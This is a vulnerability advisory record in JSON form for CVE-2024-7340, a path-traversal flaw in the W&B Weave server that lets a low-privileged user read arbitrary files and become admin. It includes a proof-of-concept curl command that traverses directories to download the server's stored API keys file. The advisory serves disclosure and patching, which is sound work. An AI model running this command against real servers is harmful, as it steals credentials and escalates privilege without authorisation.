{"hash":"1d72682a8626496def5e16c9e2490fe6dea9f837","data":{"post":{"title":"W&B Weave server remote arbitrary file leak","path":"/vulnerabilities/wandb-weave-server-remote-arbitrary-file-leak-jfsa-2024-001039248/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>W&#x26;B Weave server remote arbitrary file leak and privilege escalation</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p>weave</p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>(,0.50.7]</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>The Weave server API allows remote users to fetch files from a specific directory, but due to a lack of input validation, it is possible to traverse and leak arbitrary files remotely. In various common scenarios, this allows a low-privileged user to assume the role of the server admin.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<pre><code>export WANDB=&#x3C;WANDB SESSION COOKIE>\nexport WANDB_SSO=&#x3C;WANDB SSO SESSION COOKIE>\nexport SERVER_IP=&#x3C;WANDB SERVER IP>\n\ncurl -s --path-as-is --cookie \"wandb=$WANDB; wandb_sso=$WANDB_SSO\" \"http://$SERVER_IP:8080/__weave/file/vol/weave/cache/../../../vol/mysql/wandb_local/api_keys.ibd\" --output apikeys.bin\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No mitigations are supplied for this issue</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/wandb/weave/pull/1657\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Vendor fix</a></p>\n","description":"CVE-2024-7340, HIGH, W&B Weave server remote arbitrary file leak","date_published":"2024-07-31","xray_id":"JFSA-2024-001039248","vul_id":"CVE-2024-7340","severity":"high","discovered_by":"Natan Nehorai and Uriya Yavnieli","last_updated":"2024-07-31","cvss":8.8}},"context":{}}